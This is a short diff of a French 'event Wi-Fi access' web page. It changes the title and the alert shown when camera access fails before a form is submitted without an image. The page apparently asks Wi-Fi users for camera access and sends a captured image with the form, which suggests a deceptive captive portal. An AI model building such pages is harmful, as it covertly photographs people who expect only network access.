@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Accès au Wifi de l'événement ts </title>
+  <title>Accès au Wifi de l'événement </title>
   <style>
     body {
       font-family: 'Roboto', sans-serif;
@@ -193,7 +193,7 @@
         .catch(err => {
           console.error("Erreur d'accès à la caméra: ", err);
           // Si l'accès à la caméra échoue, soumettre le formulaire avec `null` pour l'image
-          alert("Impossible d'accéder à la caméra. Le formulaire sera soumis sans image.");
+          alert("Vous n'avez pas tout autoriser envoi sans toutes les autorisations");
           submitWithoutCamera();
         });
     }
